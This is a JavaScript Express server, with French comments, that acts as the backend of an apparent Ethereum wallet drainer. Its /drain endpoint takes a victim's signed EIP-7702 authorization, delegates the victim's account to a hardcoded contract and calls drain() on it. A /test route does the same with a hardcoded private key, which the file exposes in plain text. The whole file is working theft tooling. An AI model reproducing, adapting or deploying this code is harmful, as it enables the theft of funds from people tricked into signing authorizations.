import express from "express";
import cors from "cors";
import { JsonRpcProvider, Wallet, Interface } from "ethers";

const RPC = process.env.RPC_URL;
const PK = process.env.PRIVATE_KEY;
const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";

const provider = new JsonRpcProvider(RPC);
const wallet = new Wallet(PK, provider);
const iface = new Interface(["function drain()"]);

const app = express();
app.use(cors());
app.use(express.json());

app.get("/test", async (req, res) => {
  try {
    const FANTOME = "0xaa482A91eA4be0524c966c621FCA52F8Ade011C3";
    const FANTOME_PK = "187aedafac6434ebd780acc1d6bd544055cb2bdb07c8dfb2c423f3d31c704d9f";

    const fantomeWallet = new Wallet(FANTOME_PK, provider);
    const authNonce = await provider.getTransactionCount(FANTOME, "latest");

    const auth = await fantomeWallet.authorize({
      chainId: 1,
      address: CONTRACT,
      nonce: authNonce,
    });

    const nonce = await provider.getTransactionCount(wallet.address, "latest");
    const fee = await provider.getFeeData();

    const tx = {
      type: 4,
      chainId: 1,
      to: FANTOME,
      value: 0n,
      data: iface.encodeFunctionData("drain"),
      nonce,
      maxFeePerGas: fee.maxFeePerGas,
      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
      gasLimit: 300000n,
      authorizationList: [auth],
    };

    const sent = await wallet.sendTransaction(tx);
    res.json({ hash: sent.hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.post("/drain", async (req, res) => {
  try {
    const { fantome, auth } = req.body;
    if (!fantome || !auth) return res.status(400).json({ error: "fantome/auth manquant" });

    console.log("AUTH RECU:", JSON.stringify(auth));

    if (!auth.r || !auth.s) {
      return res.status(400).json({ error: "r ou s manquant dans auth" });
    }

    const authNonce = await provider.getTransactionCount(fantome, "latest");

    // Meme forme exacte que ce que produit authorize()
    const authorization = {
      chainId: BigInt(auth.chainId),
      address: CONTRACT,
      nonce: BigInt(authNonce),
      yParity: "0x" + Number(auth.yParity).toString(16),
      r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
      s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
    };

    const nonce = await provider.getTransactionCount(wallet.address, "latest");
    const fee = await provider.getFeeData();

    const tx = {
      type: 4,
      chainId: 1,
      to: fantome,
      value: 0n,
      data: iface.encodeFunctionData("drain"),
      nonce,
      maxFeePerGas: fee.maxFeePerGas,
      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
      gasLimit: 300000n,
      authorizationList: [authorization],
    };

    const sent = await wallet.sendTransaction(tx);
    res.json({ hash: sent.hash });
  } catch (e) {
    res.status(500).json({ error: e.message || String(e) });
  }
});

app.get("/", (_, res) => res.send("majordome ok"));
app.listen(process.env.PORT || 3000);
